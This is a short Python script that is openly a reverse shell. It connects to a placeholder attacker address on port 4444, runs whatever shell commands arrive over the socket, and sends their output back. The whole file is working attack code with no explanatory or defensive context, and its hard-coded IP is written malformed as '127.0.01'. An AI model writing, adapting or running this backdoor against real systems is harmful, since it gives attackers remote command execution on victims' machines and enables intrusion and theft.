import socket
import subprocess
import os

ATTACKER_IP = "127.0.01"  # Change to your attacker's IP
ATTACKER_PORT = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ATTACKER_IP, ATTACKER_PORT))

while True:
    data = s.recv(1024).decode().strip()
    if data.lower() == "exit":
        break
    if data.startswith("cd "):
        try:
            os.chdir(data[3:].strip())
            s.send(b"Changed directory\n")
        except Exception as e:
            s.send(str(e).encode() + b"\n")
        continue
    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    stdout_value = proc.stdout.read() + proc.stderr.read()
    if not stdout_value:
        stdout_value = b"\n"
    s.send(stdout_value)

s.close()
